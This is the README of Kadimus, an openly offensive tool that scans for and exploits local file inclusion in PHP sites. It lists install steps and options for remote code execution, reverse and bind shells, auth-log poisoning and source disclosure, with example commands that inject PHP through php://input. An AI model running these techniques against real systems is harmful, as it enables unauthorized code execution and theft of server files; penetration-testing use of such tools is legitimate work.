# Kadimus
LFI Scan &amp; Exploit Tool

## Compile:
### Installing libcurl:
* CentOS/Fedora

```sh
# yum install libcurl-devel
```

* Debian based
```sh
# apt-get install libcurl4-openssl-dev
```
### Installing libpcre:
* CentOS/Fedora

```sh
# yum install libpcre-devel
```

* Debian based
```sh
# apt-get install libpcre3-dev
```

### Installing libssh:

* CentOS/Fedora

```sh
# yum install libssh-devel
```

* Debian based
```sh
# apt-get install libssh-dev
```
### And finally:
```sh
$ git clone https://github.com/P0cL4bs/Kadimus.git
$ cd Kadimus
$ make
```
## Options:
```
  -h, --help                    Display this help menu

  Request:
    -B, --cookie STRING         Set custom HTTP Cookie header
    -A, --user-agent STRING     User-Agent to send to server
    --connect-timeout SECONDS   Maximum time allowed for connection
    --retry-times NUMBER        number of times to retry if connection fails

  Scanner:
    -u, --url STRING            Single URI to scan
    -U, --url-list FILE         File contains URIs to scan
    -o, --output FILE           File to save output results
    --threads NUMBER            Number of threads (2..1000)

  Explotation:
    -t, --target STRING         Vulnerable Target to exploit
    --injec-at STRING           Parameter name to inject exploit
                                (only need with RCE data and source disclosure)

  RCE:
    -X, --rce-technique=TECH    LFI to RCE technique to use
    -C, --code STRING           Custom PHP code to execute, with php brackets
    -c, --cmd STRING            Execute system command on vulnerable target system
    -s, --shell                 Simple command shell interface through HTTP Request

    -r, --reverse-shell         Try spawn a reverse shell connection.
    -l, --listen                port to listen

    -b, --bind-shell            Try connect to a bind-shell
    -i, --connect-to STRING     Ip/Hostname to connect
    -p, --port NUMBER           Port number to connect

    --ssh-port NUMBER           Set the SSH Port to try inject command (Default: 22)
    --ssh-target STRING         Set the SSH Host (Default: Target URI hostname)

    RCE Available techniques

      environ                   Try run PHP Code using /proc/self/environ
      input                     Try run PHP Code using php://input
      auth                      Try run PHP Code using /var/log/auth.log
      data                      Try run PHP Code using data://text

    Source Disclosure:
      -G, --get-source          Try get the source files using filter://
      -f, --filename STRING     Set filename to grab source [REQUIRED]
      -O FILE                   Set output file (Default: stdout)
```

## Examples:

### Scanning:
```
./kadimus -u localhost/?pg=contact -A my_user_agent
./kadimus -U url_list.txt --threads 10 --connect-timeout 10 --retry-times 0
```
### Get source code of file:
```
./kadimus -t localhost/?pg=contact -G -f "index.php%00" -O local_output.php --inject-at pg
```
### Execute php code:
```
./kadimus -t localhost/?pg=php://input%00 -C '<?php echo "pwned"; ?>' -X input
```
